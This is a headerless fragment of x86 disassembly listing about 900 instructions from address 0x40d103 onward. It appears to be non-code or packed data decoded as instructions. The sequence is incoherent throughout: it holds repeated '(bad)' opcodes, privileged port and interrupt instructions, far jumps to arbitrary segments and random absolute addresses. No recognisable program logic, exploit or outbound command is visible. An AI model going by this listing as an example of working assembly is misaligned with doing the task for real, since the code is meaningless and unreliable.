  40d103:	or     cl,BYTE PTR [ebx+esi*1]
  40d106:	pop    ecx
  40d107:	loop   0x40d138
  40d109:	scas   al,BYTE PTR es:[edi]
  40d10a:	fnsave [edx-0x4124e165]
  40d110:	out    dx,al
  40d111:	es lahf 
  40d113:	ror    BYTE PTR [ecx],0xfe
  40d116:	xor    eax,0xb25387d2
  40d11b:	mov    esi,0x876a74fd
  40d120:	xchg   edx,eax
  40d121:	mov    bh,0xbf
  40d123:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d124:	xor    DWORD PTR ds:0x9aac5aa7,esp
  40d12a:	adc    DWORD PTR [ecx+ecx*8+0x53],edx
  40d12e:	test   eax,0x37e0feef
  40d133:	and    ah,cl
  40d135:	jg     0x40d1b5
  40d137:	pop    ebp
  40d138:	sbb    al,0x79
  40d13a:	sar    BYTE PTR [edi+edi*2-0x39],0xbb
  40d13f:	dec    BYTE PTR [ecx-0x43]
  40d142:	push   esp
  40d143:	out    dx,al
  40d144:	daa    
  40d145:	cwde   
  40d146:	repnz xor DWORD PTR [edx-0x5],esp
  40d14a:	repz add eax,0xd4275ba5
  40d150:	xor    al,0x86
  40d152:	inc    ecx
  40d153:	(bad)  
  40d155:	data16 data16 and BYTE PTR [esi+0x41b28baa],ch
  40d15d:	sar    esi,cl
  40d15f:	lock sub BYTE PTR [ecx],bh
  40d162:	inc    esi
  40d163:	mov    edi,0x914bb223
  40d168:	mov    edi,0x18eb417
  40d16d:	js     0x40d161
  40d16f:	jmp    0x73cd:0xb6d00bb7
  40d176:	daa    
  40d177:	dec    edi
  40d178:	inc    ebp
  40d179:	fs cwde 
  40d17b:	xchg   ebx,eax
  40d17c:	adc    eax,0x8937957c
  40d181:	pushf  
  40d182:	sti    
  40d183:	iret   
  40d184:	ins    BYTE PTR es:[edi],dx
  40d185:	sahf   
  40d186:	push   cs
  40d187:	jne    0x40d169
  40d189:	lods   al,BYTE PTR ds:[esi]
  40d18a:	mov    cl,0xb3
  40d18c:	mov    bh,BYTE PTR [ebx]
  40d18e:	fisubr WORD PTR [ebp+ecx*8+0x4c232701]
  40d195:	inc    ecx
  40d196:	and    al,ah
  40d198:	mov    esi,0xbd816a66
  40d19d:	imul   esi,DWORD PTR [ebp+0x472b99aa],0x1d
  40d1a4:	lea    edx,[esi-0x51]
  40d1a7:	dec    eax
  40d1a8:	inc    esi
  40d1a9:	dec    DWORD PTR [edi+eiz*8]
  40d1ac:	sbb    al,0xe8
  40d1ae:	dec    esi
  40d1af:	test   cl,cl
  40d1b1:	pop    edi
  40d1b2:	add    DWORD PTR [edi],ebp
  40d1b4:	mov    al,ds:0x764e6c22
  40d1b9:	mov    ds:0xebeff1cb,eax
  40d1be:	xchg   ebx,ebx
  40d1c0:	xchg   esi,eax
  40d1c1:	jno    0x40d144
  40d1c3:	outs   dx,BYTE PTR ds:[esi]
  40d1c4:	sbb    ebp,DWORD PTR [ebx+0x3c101778]
  40d1ca:	loope  0x40d188
  40d1cc:	sbb    bh,BYTE PTR [ebp+0xe]
  40d1cf:	fsub   QWORD PTR [esi+0x19]
  40d1d2:	fild   QWORD PTR [edi+ecx*4-0x1c]
  40d1d6:	int    0x44
  40d1d8:	mov    esi,0x81c82f72
  40d1dd:	ss jae 0x40d21c
  40d1e0:	jmp    0x5cce:0x8a985909
  40d1e7:	hlt    
  40d1e8:	sbb    al,BYTE PTR [eax-0x20]
  40d1eb:	add    al,0xf6
  40d1ed:	cmp    al,0x13
  40d1ef:	mov    BYTE PTR [ecx+0x4a],0xb8
  40d1f3:	and    DWORD PTR [eax+0x10],esp
  40d1f6:	hlt    
  40d1f7:	ror    BYTE PTR [ebp-0x2b7e3996],cl
  40d1fd:	pop    ebx
  40d1fe:	push   ecx
  40d1ff:	lea    esi,[ecx]
  40d201:	adc    eax,DWORD PTR [esi+eiz*4]
  40d204:	icebp  
  40d205:	mov    ch,0x5a
  40d207:	inc    ebp
  40d208:	stos   BYTE PTR es:[edi],al
  40d209:	mov    BYTE PTR [esi+0x60],al
  40d20c:	ins    DWORD PTR es:[edi],dx
  40d20d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d20e:	add    al,0xe0
  40d210:	mul    DWORD PTR [ecx+0x5]
  40d213:	or     BYTE PTR [edx],dl
  40d215:	mov    esi,edi
  40d217:	ja     0x40d257
  40d219:	or     eax,0xb8be93ad
  40d21e:	test   DWORD PTR [ebx-0x6c],eax
  40d221:	or     dh,bh
  40d223:	imul   ebp,ebp,0x9073ec72
  40d229:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d22a:	adc    al,0xd1
  40d22c:	sti    
  40d22d:	push   ds
  40d22e:	push   0x1bbac44d
  40d233:	in     al,0x67
  40d235:	xor    al,0xe3
  40d238:	xchg   esp,eax
  40d239:	and    ebx,DWORD PTR [edi]
  40d23b:	ret    0xb36d
  40d23e:	inc    ebp
  40d23f:	cs jmp 0x386f:0x453e0e92
  40d247:	bound  ebp,QWORD PTR [ecx]
  40d249:	inc    ebp
  40d24a:	fcmovne st,st(2)
  40d24c:	cmp    eax,0xbc74f876
  40d251:	mov    BYTE PTR [ebx],ah
  40d253:	mov    fs,WORD PTR [esi]
  40d255:	sbb    al,0x83
  40d257:	std    
  40d258:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d259:	jmp    0xa946:0x92877404
  40d260:	loopne 0x40d2cf
  40d262:	ret    0xc63c
  40d265:	adc    edi,ebp
  40d267:	sub    esp,DWORD PTR [edi]
  40d269:	jecxz  0x40d29e
  40d26b:	test   BYTE PTR [esp+edx*2-0x2605c489],bl
  40d272:	sub    DWORD PTR [ecx+0x6bd5bf5e],eax
  40d278:	dec    edi
  40d279:	cmp    esi,DWORD PTR [esi-0x5c79b3aa]
  40d27f:	sbb    al,0xbf
  40d281:	push   0xe17e2f73
  40d286:	lahf   
  40d287:	or     BYTE PTR [ebx-0x675de531],ah
  40d28d:	scas   al,BYTE PTR es:[edi]
  40d28e:	loop   0x40d26b
  40d290:	sub    eax,0x67cf6938
  40d295:	and    al,0x7
  40d297:	scas   al,BYTE PTR es:[edi]
  40d298:	and    DWORD PTR [ebx-0x3c],esp
  40d29b:	xchg   ecx,eax
  40d29c:	adc    DWORD PTR [edi+0x3ad1b6e4],esp
  40d2a2:	xor    eax,0x1681af18
  40d2a7:	sub    edx,DWORD PTR [edi+0x6fcafbc5]
  40d2ad:	or     esp,ebp
  40d2af:	add    al,0x89
  40d2b1:	mov    eax,ds:0x1c9b6401
  40d2b6:	adc    eax,0x6972d133
  40d2bb:	pop    ebx
  40d2bc:	xchg   DWORD PTR [ebx],edi
  40d2be:	jmp    0x40d240
  40d2c0:	and    bl,BYTE PTR [eax+0x74]
  40d2c3:	xchg   ebp,eax
  40d2c4:	not    BYTE PTR [eax]
  40d2c6:	mov    ebp,0x58a8c1c
  40d2cb:	loopne 0x40d266
  40d2cd:	dec    edx
  40d2ce:	cmp    dh,BYTE PTR [ecx]
  40d2d0:	push   cs
  40d2d1:	inc    ebp
  40d2d2:	test   eax,0x11fb55e
  40d2d7:	xlat   BYTE PTR ds:[ebx]
  40d2d8:	(bad)  
  40d2da:	sar    DWORD PTR [eax+0x665985d5],1
  40d2e0:	sub    DWORD PTR [eax-0x565c1c83],edi
  40d2e6:	adc    ebp,DWORD PTR [edx+0x584cab7c]
  40d2ec:	aaa    
  40d2ed:	in     al,0xb8
  40d2ef:	sti    
  40d2f0:	sub    edi,DWORD PTR [ebp-0x44]
  40d2f3:	fcomp  QWORD PTR [esi+eax*8]
  40d2f6:	xor    BYTE PTR [esi+0x3b],ch
  40d2f9:	xor    al,0x30
  40d2fb:	cmp    BYTE PTR [ebp-0x21d899da],ch
  40d301:	xor    al,0x74
  40d303:	pop    ebp
  40d304:	outs   dx,DWORD PTR ds:[esi]
  40d305:	adc    eax,0x911a4d3b
  40d30a:	pop    edi
  40d30b:	or     ecx,DWORD PTR [eax-0x1e83f0fe]
  40d311:	jg     0x40d2fb
  40d313:	mov    edi,0xbabb3840
  40d318:	scas   eax,DWORD PTR es:[edi]
  40d319:	das    
  40d31a:	je     0x40d339
  40d31c:	popf   
  40d31d:	out    dx,al
  40d31e:	and    ebx,eax
  40d320:	aas    
  40d321:	idiv   ebx
  40d323:	fiadd  DWORD PTR [ecx-0x738f98e8]
  40d329:	pop    esi
  40d32a:	inc    esp
  40d32b:	push   ebp
  40d32c:	mov    ah,0x7e
  40d32e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d32f:	mov    eax,0x584fd1ca
  40d334:	test   DWORD PTR [ebp+0x45],edx
  40d337:	jg     0x40d3ac
  40d339:	mov    dl,0x8b
  40d33b:	loop   0x40d329
  40d33d:	pop    ds
  40d33e:	sbb    ebp,DWORD PTR [edi+ebp*1+0x8]
  40d342:	ins    BYTE PTR es:[edi],dx
  40d343:	push   ecx
  40d344:	ret    0x7fd7
  40d347:	stos   BYTE PTR es:[edi],al
  40d348:	mov    al,ds:0x61bcdf32
  40d34d:	dec    eax
  40d34e:	fistp  QWORD PTR [edi+0x2504f13d]
  40d354:	mov    ebp,0xe3d4573e
  40d359:	inc    ebp
  40d35a:	mov    esi,0xc44de654
  40d35f:	xchg   BYTE PTR [ebp-0x13c54f24],dh
  40d365:	out    dx,eax
  40d366:	inc    ebx
  40d367:	stos   BYTE PTR es:[edi],al
  40d368:	xlat   BYTE PTR ds:[ebx]
  40d369:	ficomp DWORD PTR [edx]
  40d36b:	xor    bl,BYTE PTR [eax+eiz*1+0x5ff0f741]
  40d372:	inc    eax
  40d373:	fadd   QWORD PTR [ecx+0x64]
  40d376:	cdq    
  40d377:	lock std 
  40d379:	inc    esp
  40d37a:	and    al,0x49
  40d37c:	cmp    edi,eax
  40d37e:	sbb    dl,dh
  40d380:	(bad)  
  40d381:	mov    ds:0xbc3cfecb,eax
  40d386:	xor    DWORD PTR [esp+esi*8],edx
  40d389:	adc    dl,BYTE PTR [eax+0x70]
  40d38c:	dec    esp
  40d38d:	popa   
  40d38e:	jl     0x40d3ca
  40d390:	mov    eax,0x90fb830e
  40d395:	aas    
  40d396:	dec    edx
  40d397:	and    DWORD PTR [ecx+esi*2+0x71eaf7ce],edx
  40d39e:	jmp    0x5a1d33c4
  40d3a3:	aam    0x22
  40d3a5:	dec    edx
  40d3a6:	xchg   ebx,eax
  40d3a7:	cmp    al,0xbb
  40d3a9:	cmp    esi,DWORD PTR [ebp+0x52]
  40d3ac:	aaa    
  40d3ad:	mov    ch,0x90
  40d3af:	lock popa 
  40d3b1:	mov    al,ds:0xb5a34aed
  40d3b6:	sbb    al,0x92
  40d3b8:	sub    al,0x24
  40d3ba:	push   0xffffffa7
  40d3bc:	sub    BYTE PTR [esi-0xc],dl
  40d3bf:	in     eax,dx
  40d3c0:	jmp    0x804ef340
  40d3c5:	push   ss
  40d3c6:	mov    cl,0xe
  40d3c8:	add    bh,BYTE PTR [eax]
  40d3ca:	cmp    dh,BYTE PTR [ebp-0x4146de64]
  40d3d0:	adc    BYTE PTR [ebx],dh
  40d3d2:	fnstenv [edi]
  40d3d4:	ja     0x40d415
  40d3d6:	outs   dx,BYTE PTR ds:[esi]
  40d3d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3d8:	loopne 0x40d435
  40d3da:	and    esp,DWORD PTR [esi+0x55997a03]
  40d3e0:	mov    dh,ah
  40d3e2:	jmp    0xd848:0xc8c67f93
  40d3e9:	lods   al,BYTE PTR ds:[esi]
  40d3ea:	ficomp WORD PTR [ebp+0x4f]
  40d3ed:	sub    al,0xd1
  40d3ef:	or     bl,BYTE PTR [esi]
  40d3f1:	inc    esp
  40d3f2:	pushf  
  40d3f3:	pop    ds
  40d3f4:	popf   
  40d3f5:	mov    cl,0x9b
  40d3f7:	dec    eax
  40d3f8:	bound  ebp,QWORD PTR [eax]
  40d3fa:	jo     0x40d3e2
  40d3fc:	lds    ebx,FWORD PTR [ecx]
  40d3fe:	mov    ebx,0x20c47a7f
  40d403:	in     al,0x27
  40d405:	pop    ebp
  40d406:	xor    BYTE PTR [esi+0x578e36d8],ah
  40d40c:	inc    eax
  40d40d:	shr    DWORD PTR [esi-0x3ee2657c],cl
  40d413:	or     eax,0x5691fe64
  40d418:	imul   edx,DWORD PTR [ecx+0x39e68cc6],0x48
  40d41f:	aaa    
  40d420:	stos   DWORD PTR es:[edi],eax
  40d421:	add    eax,0x414aa9ad
  40d426:	jo     0x40d3bf
  40d428:	imul   BYTE PTR [ecx]
  40d42a:	xor    DWORD PTR [ebx],esi
  40d42c:	mov    ds:0x5fa5b4a0,eax
  40d431:	sub    eax,DWORD PTR [ebx]
  40d433:	mov    eax,ds:0xc5bb7138
  40d438:	sbb    eax,0x51af8fbf
  40d43d:	sub    eax,0x756891d6
  40d442:	pop    ebp
  40d443:	mov    edi,DWORD PTR [ebx]
  40d445:	mov    ebp,0x368ca42d
  40d44a:	aam    0xb5
  40d44c:	and    al,0x8
  40d44e:	pop    edi
  40d44f:	add    al,0x35
  40d451:	adc    bl,BYTE PTR [ebp-0x72eabf6e]
  40d457:	mov    esp,0x9061eca7
  40d45c:	in     al,dx
  40d45d:	xor    eax,0x570e96fa
  40d462:	popf   
  40d463:	xor    esi,ebx
  40d465:	gs pop ebp
  40d467:	pushf  
  40d468:	(bad)  
  40d469:	test   bh,0x8a
  40d46c:	and    BYTE PTR [edi-0x2],ah
  40d46f:	ins    BYTE PTR es:[edi],dx
  40d470:	mov    ds:0x6f8ba898,al
  40d475:	jb     0x40d4ab
  40d477:	int3   
  40d478:	mov    al,0xe0
  40d47a:	mov    eax,edi
  40d47c:	inc    ecx
  40d47d:	jl     0x40d442
  40d47f:	pop    esp
  40d480:	fucomp st(0)
  40d482:	jle    0x40d4a4
  40d484:	xor    bl,ah
  40d486:	xor    DWORD PTR [edx+eax*8-0x79029b76],ebx
  40d48d:	sbb    al,0xd8
  40d48f:	cmp    BYTE PTR [ebx+0x41],al
  40d492:	cmp    al,0x9d
  40d494:	mov    eax,ds:0x44f8b66e
  40d499:	ins    DWORD PTR es:[edi],dx
  40d49a:	outs   dx,DWORD PTR ds:[esi]
  40d49b:	adc    eax,0x5bd2c2ab
  40d4a0:	inc    ebx
  40d4a1:	ror    BYTE PTR [edi+0xb973798],1
  40d4a7:	pushf  
  40d4a8:	push   esi
  40d4a9:	pop    esp
  40d4aa:	leave  
  40d4ab:	or     al,0xa4
  40d4ad:	shr    DWORD PTR [ebx+0x58],0x6b
  40d4b1:	push   0xf5465f3e
  40d4b6:	jp     0x40d513
  40d4b8:	inc    esi
  40d4b9:	push   esi
  40d4ba:	mov    esi,0xa7598ab7
  40d4bf:	fdiv   DWORD PTR [eax-0x73119cfc]
  40d4c5:	pop    ecx
  40d4c6:	push   esi
  40d4c7:	clc    
  40d4c8:	mov    eax,0xdbef8f1f
  40d4cd:	idiv   edx
  40d4cf:	repz xlat BYTE PTR ds:[ebx]
  40d4d1:	and    DWORD PTR [ecx],edx
  40d4d3:	cmp    dl,BYTE PTR [edx]
  40d4d5:	daa    
  40d4d6:	lahf   
  40d4d7:	adc    BYTE PTR [edx+0x40a48d38],al
  40d4dd:	mov    DWORD PTR [eax-0x6532653b],edi
  40d4e3:	mov    bl,0x95
  40d4e5:	adc    dh,BYTE PTR [esi+eax*1]
  40d4e8:	adc    esp,DWORD PTR [ebx-0x2705600c]
  40d4ee:	lea    edi,[edx-0x63]
  40d4f1:	ds call 0x498b9805
  40d4f7:	push   cs
  40d4f8:	push   cs
  40d4f9:	xchg   ecx,edi
  40d4fb:	dec    eax
  40d4fc:	repnz shl ah,1
  40d4ff:	ror    DWORD PTR [edi-0x13],1
  40d502:	in     al,dx
  40d503:	call   0xf5023c55
  40d508:	fdiv   st,st(4)
  40d50a:	stos   BYTE PTR es:[edi],al
  40d50b:	jne    0x40d518
  40d50d:	in     al,0xd3
  40d50f:	xchg   ebp,eax
  40d510:	mov    ebx,0x3b7e9a33
  40d515:	loop   0x40d547
  40d517:	stc    
  40d518:	data16 addr16 jp 0x40d515
  40d51c:	jb     0x40d550
  40d51e:	sbb    dl,BYTE PTR ds:0x4facf9b7
  40d524:	sub    bl,BYTE PTR [esi+eax*4]
  40d527:	or     BYTE PTR [eax+0x2e6abc5b],bh
  40d52d:	aam    0x6e
  40d52f:	adc    DWORD PTR [eax+0x1a416c3a],eax
  40d535:	outs   dx,DWORD PTR ds:[esi]
  40d536:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d537:	rcr    DWORD PTR [eax-0x1d],1
  40d53a:	rcl    BYTE PTR [esi],0x4f
  40d53d:	scas   eax,DWORD PTR es:[edi]
  40d53e:	inc    eax
  40d53f:	dec    edx
  40d540:	pushf  
  40d541:	jg     0x40d52c
  40d543:	pop    ebx
  40d544:	mov    ah,BYTE PTR [edi]
  40d546:	xchg   edi,ebx
  40d548:	adc    DWORD PTR [eax+0x22],0x2e
  40d54c:	push   ss
  40d54d:	push   eax
  40d54e:	scas   al,BYTE PTR es:[edi]
  40d54f:	pop    edx
  40d550:	mov    dl,0xc0
  40d552:	(bad)  
  40d553:	xlat   BYTE PTR ds:[ebx]
  40d554:	push   ss
  40d555:	ds sahf 
  40d557:	dec    BYTE PTR [ebx-0x5b]
  40d55a:	popa   
  40d55b:	adc    esi,esi
  40d55d:	rcr    BYTE PTR [ebx+esi*2],1
  40d560:	cmp    eax,0x4d8ab876
  40d565:	sti    
  40d566:	scas   al,BYTE PTR es:[edi]
  40d567:	or     esp,DWORD PTR [ecx-0x30]
  40d56a:	push   ds
  40d56b:	icebp  
  40d56c:	add    ch,ah
  40d56e:	dec    eax
  40d56f:	mov    dl,0x96
  40d571:	lods   eax,DWORD PTR ds:[esi]
  40d572:	out    0xc9,al
  40d574:	pushf  
  40d575:	xchg   al,al
  40d577:	pop    ss
  40d578:	cs ret 0xb660
  40d57c:	pop    edi
  40d57d:	push   edi
  40d57e:	icebp  
  40d57f:	xchg   ebx,eax
  40d580:	jbe    0x40d547
  40d582:	add    al,0xb1
  40d584:	mov    ah,0xac
  40d586:	pusha  
  40d587:	push   edx
  40d588:	xor    BYTE PTR [esi+0x38],ah
  40d58b:	leave  
  40d58c:	inc    edx
  40d58d:	xchg   ecx,eax
  40d58e:	add    DWORD PTR ss:[ecx+edx*8],0x1b
  40d593:	sti    
  40d594:	sbb    dh,0xc
  40d597:	(bad)  
  40d598:	sub    ecx,DWORD PTR [ecx]
  40d59a:	adc    al,ch
  40d59c:	adc    ecx,DWORD PTR ds:0xee07c5a6
  40d5a2:	dec    esp
  40d5a3:	adc    ecx,edi
  40d5a5:	mov    ah,0xc0
  40d5a7:	shl    BYTE PTR [edi+ebp*8],1
  40d5aa:	or     DWORD PTR [eax+0x8],ebp
  40d5ad:	xor    DWORD PTR [ecx+0x1a25ff3e],ebp
  40d5b3:	mov    edx,0xd8661e4e
  40d5b8:	xor    DWORD PTR [eax-0x3715e089],0xf8a429b9
  40d5c2:	loope  0x40d60f
  40d5c4:	xor    DWORD PTR [eax-0x50],edi
  40d5c7:	mov    eax,0xfd2bab2c
  40d5cc:	retf   0x413
  40d5cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5d0:	xor    BYTE PTR [esi+0xe],ch
  40d5d3:	mov    edi,0x9d636a2a
  40d5d8:	mov    dl,0x7f
  40d5da:	mov    esi,0x718b79df
  40d5df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5e0:	inc    edi
  40d5e1:	aas    
  40d5e2:	addr16 push ds
  40d5e4:	pop    edx
  40d5e5:	fcmovb st,st(7)
  40d5e7:	mov    ch,0x95
  40d5e9:	js     0x40d585
  40d5eb:	mov    eax,DWORD PTR [ebx+0x16]
  40d5ee:	enter  0x314b,0x58
  40d5f2:	adc    eax,0xc1740007
  40d5f7:	sbb    BYTE PTR [ecx+0x11],bl
  40d5fa:	xchg   ecx,eax
  40d5fb:	lods   eax,DWORD PTR ds:[esi]
  40d5fc:	imul   ebx,esi,0xffffffa3
  40d5ff:	mov    esp,0xd96e4d8f
  40d604:	arpl   WORD PTR [ecx+0x102e6d5],ax
  40d60a:	jae    0x40d663
  40d60c:	outs   dx,DWORD PTR ds:[esi]
  40d60d:	enter  0x49c,0xa2
  40d611:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d612:	je     0x40d5e2
  40d614:	xor    DWORD PTR [eax-0x6f8cbcff],esp
  40d61a:	aaa    
  40d61b:	mov    ebp,DWORD PTR [esp+ebp*4]
  40d61e:	pop    edi
  40d61f:	inc    ebx
  40d620:	pop    ebx
  40d621:	mov    edi,0x2c5913b8
  40d626:	ds in  al,0xa7
  40d629:	lds    eax,FWORD PTR ds:0x1e58e195
  40d62f:	add    cl,al
  40d631:	jg     0x40d66d
  40d633:	rol    BYTE PTR [eax-0x1f84e16],1
  40d639:	or     eax,0xa539fa88
  40d63e:	xchg   BYTE PTR [ebx+0x330e639c],al
  40d644:	add    dl,BYTE PTR [edx+0x2bd493cb]
  40d64a:	jp     0x40d62c
  40d64c:	hlt    
  40d64d:	ret    0xbceb
  40d650:	out    dx,eax
  40d651:	(bad)  
  40d652:	jns    0x40d696
  40d654:	das    
  40d655:	outs   dx,BYTE PTR ds:[esi]
  40d656:	inc    ebp
  40d657:	jp     0x40d60f
  40d659:	pop    eax
  40d65a:	inc    ecx
  40d65b:	test   BYTE PTR [ebp+ebx*1-0x69],dl
  40d65f:	repnz mov dh,0xb4
  40d662:	add    ecx,DWORD PTR [ebp+0x17342ece]
  40d668:	pop    edx
  40d669:	push   ds
  40d66a:	push   ebp
  40d66b:	(bad)  
  40d66c:	js     0x40d6d6
  40d66e:	jg     0x40d606
  40d670:	jno    0x40d61e
  40d672:	mov    edi,esi
  40d674:	cmc    
  40d675:	mov    ah,al
  40d677:	mul    DWORD PTR [eax+0x78292ace]
  40d67d:	inc    esp
  40d67e:	loope  0x40d664
  40d680:	mov    al,0xec
  40d682:	add    al,0xfb
  40d684:	out    dx,eax
  40d685:	cli    
  40d686:	mov    cs,esi
  40d688:	imul   ebx,ecx,0xdd3cb448
  40d68e:	inc    ebx
  40d68f:	mov    dl,0xdd
  40d691:	xor    eax,0x1b87041c
  40d697:	pop    ebx
  40d698:	bound  eax,QWORD PTR [edi]
  40d69a:	dec    eax
  40d69b:	adc    eax,0xc34a3f
  40d6a0:	or     edi,DWORD PTR [edx]
  40d6a2:	or     eax,0x936f4653
  40d6a7:	jo     0x40d64a
  40d6a9:	(bad)  
  40d6aa:	out    dx,al
  40d6ab:	out    0x9b,eax
  40d6ad:	gs push ss
  40d6af:	dec    ebp
  40d6b0:	test   BYTE PTR [edx+0x4bd7db6b],0xe0
  40d6b7:	sbb    al,0x7d
  40d6b9:	xchg   DWORD PTR [ebx-0x747befd6],ecx
  40d6bf:	mov    dh,0xd2
  40d6c1:	ror    DWORD PTR [edi],0x4b
  40d6c4:	mov    eax,0x142e53b4
  40d6c9:	stos   DWORD PTR es:[edi],eax
  40d6ca:	xor    bh,ch
  40d6cc:	stc    
  40d6cd:	cmp    eax,0xdf550e23
  40d6d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6d3:	daa    
  40d6d4:	and    BYTE PTR [edx-0x1365b7ef],dh
  40d6da:	mov    DWORD PTR ds:0xc4dd9666,0x35a0f698
  40d6e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6e5:	loopne 0x40d72c
  40d6e7:	mov    ds:0x3dce365f,al
  40d6ec:	shl    BYTE PTR ds:0x50e04694,0xdd
  40d6f3:	sub    ebp,esi
  40d6f5:	out    0x75,al
  40d6f7:	call   0x7c20c3ec
  40d6fc:	and    eax,0x3f6af724
  40d701:	(bad)  
  40d702:	push   es
  40d703:	push   esi
  40d704:	xchg   ebp,eax
  40d705:	mov    ebp,0x1f3d7701
  40d70a:	pushf  
  40d70b:	xor    edx,esp
  40d70d:	cmp    BYTE PTR [ecx+0x5c9fa5c3],bh
  40d713:	aaa    
  40d714:	push   0x76248290
  40d719:	push   ebp
  40d71a:	push   edx
  40d71b:	ins    BYTE PTR es:[edi],dx
  40d71c:	je     0x40d786
  40d71e:	inc    ebx
  40d71f:	daa    
  40d720:	or     al,BYTE PTR [esi+0x28]
  40d723:	lahf   
  40d724:	shr    DWORD PTR [ebx+0x42c7686d],cl
  40d72a:	jne    0x40d73f
  40d72c:	dec    esi
  40d72d:	fild   DWORD PTR ss:[edi]
  40d730:	push   ecx
  40d731:	icebp  
  40d732:	jne    0x40d6c1
  40d734:	push   0x1
  40d736:	ror    dl,1
  40d738:	add    BYTE PTR [ecx],bh
  40d73a:	mov    DWORD PTR [eax+0x54559f08],esp
  40d740:	push   eax
  40d741:	push   esi
  40d742:	xchg   ecx,eax
  40d743:	iret   
  40d744:	(bad)  
  40d745:	and    eax,0xf7b305ae
  40d74a:	cmp    eax,0xb00bd1b7
  40d74f:	adc    ah,BYTE PTR gs:[esi+0x16375d72]
  40d756:	xchg   ebp,eax
  40d757:	frstor [eax+eax*4]
  40d75a:	in     eax,dx
  40d75b:	data16 and BYTE PTR [ebx],ch
  40d75e:	xchg   BYTE PTR [ecx],dh
  40d760:	sub    ch,BYTE PTR [ebp+0x2e]
  40d763:	dec    ecx
  40d764:	cmp    eax,0x15e90ca1
  40d769:	lock pop ebx
  40d76b:	add    ah,BYTE PTR [ecx+esi*2+0x14]
  40d76f:	dec    ebp
  40d770:	jbe    0x40d7af
  40d772:	inc    ebp
  40d773:	push   es
  40d774:	mov    esi,0x301cd628
  40d779:	lods   eax,DWORD PTR ds:[esi]
  40d77a:	mov    bl,0x4d
  40d77c:	rol    DWORD PTR [esi+eiz*1],cl
  40d77f:	fld    DWORD PTR [esi-0x2d]
  40d782:	shl    BYTE PTR [edi-0x42ea23b8],cl
  40d788:	iret   
  40d789:	fidivr DWORD PTR ds:0x849d87a5
  40d78f:	and    bl,BYTE PTR [ebp-0x28052a26]
  40d795:	stos   DWORD PTR es:[edi],eax
  40d796:	leave  
  40d797:	pop    eax
  40d798:	aaa    
  40d799:	sub    WORD PTR [esp+ecx*8],bp
  40d79d:	xchg   ebp,eax
  40d79e:	add    al,0xf9
  40d7a0:	jecxz  0x40d73f
  40d7a2:	imul   edx,DWORD PTR [esi+0x48edd027],0xfffffffc
  40d7a9:	dec    ecx
  40d7aa:	int    0x67
  40d7ac:	out    dx,eax
  40d7ad:	xchg   edx,eax
  40d7ae:	test   BYTE PTR [eax+0x2886fc2],dl
  40d7b4:	fcom   DWORD PTR [eax-0x75]
  40d7b7:	cld    
  40d7b8:	(bad)  
  40d7b9:	push   cs
  40d7ba:	pop    ecx
  40d7bb:	cmp    eax,0x4f855a1a
  40d7c0:	jmp    0xd5623cbd
  40d7c5:	or     BYTE PTR [esi],bh
  40d7c7:	je     0x40d7d9
  40d7c9:	mov    ch,0x23
  40d7cb:	aaa    
  40d7cc:	mov    eax,0xe1f0a715
  40d7d1:	mov    BYTE PTR [eax],bl
  40d7d3:	cmp    al,0x7a
  40d7d5:	imul   eax,DWORD PTR [esp+edi*2+0x613dddb1],0xfffffff6
  40d7dd:	rcr    BYTE PTR [edi+0x695f7b08],0x1f
  40d7e4:	jnp    0x40d862
  40d7e6:	inc    esp
  40d7e7:	ss jecxz 0x40d84a
  40d7ea:	cmp    eax,0xb33252eb
  40d7ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7f0:	pop    ebx
  40d7f1:	loop   0x40d802
  40d7f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7f4:	cs jo  0x40d854
  40d7f7:	push   esi
  40d7f8:	jbe    0x40d7e3
  40d7fa:	gs stc 
  40d7fc:	shr    DWORD PTR ds:0x2a74acda,1
  40d802:	popa   
  40d803:	pop    esi
  40d804:	dec    ecx
  40d805:	xchg   BYTE PTR [ebx],bh
  40d807:	imul   esp,DWORD PTR [ecx-0x554b9c16],0x44
  40d80e:	jl     0x40d82e
  40d810:	js     0x40d878
  40d812:	out    dx,al
  40d813:	inc    edx
  40d814:	clc    
  40d815:	out    dx,eax
  40d816:	lds    edx,FWORD PTR [edx+esi*2+0x7b]
  40d81a:	xlat   BYTE PTR ds:[ebx]
  40d81b:	pushw  0xffe6
  40d81e:	sbb    bh,BYTE PTR [edx+0x36]
  40d821:	xchg   edx,eax
  40d822:	ds hlt 
  40d824:	lods   eax,DWORD PTR ds:[esi]
  40d825:	cmc    
  40d826:	and    cl,ch
  40d828:	xchg   edx,eax
  40d829:	mov    esp,0xc820f99b
  40d82e:	pop    esi
  40d82f:	mov    ebx,0x6cdd1228
  40d834:	fistp  QWORD PTR [esi-0x4a77c53c]
  40d83a:	cmp    cl,cl
  40d83c:	ins    BYTE PTR es:[edi],dx
  40d83d:	sub    eax,0xbde66643
  40d842:	mov    eax,0xe28c2345
  40d847:	sub    ebx,esi
  40d849:	retf   
  40d84a:	mov    edx,0xa3f8e9fa
  40d84f:	repz or DWORD PTR [edi],edx
  40d852:	inc    edi
  40d853:	loop   0x40d845
  40d855:	test   BYTE PTR [ebp-0x5b],al
  40d858:	sbb    al,0x63
  40d85a:	pop    eax
  40d85b:	scas   al,BYTE PTR es:[edi]
  40d85c:	daa    
  40d85d:	pop    ds
  40d85e:	dec    esp
  40d85f:	pop    ss
  40d860:	out    0x44,eax
  40d862:	dec    edi
  40d863:	loop   0x40d84a
  40d865:	dec    ebx
  40d866:	mov    bl,0xfd
  40d868:	jns    0x40d82c
  40d86a:	lea    ebx,[ecx+0x4be892e3]
  40d870:	ja     0x40d8bc
  40d872:	rcr    BYTE PTR [ebx],1
  40d874:	imul   edx,DWORD PTR [ecx+eax*1],0xffffff94
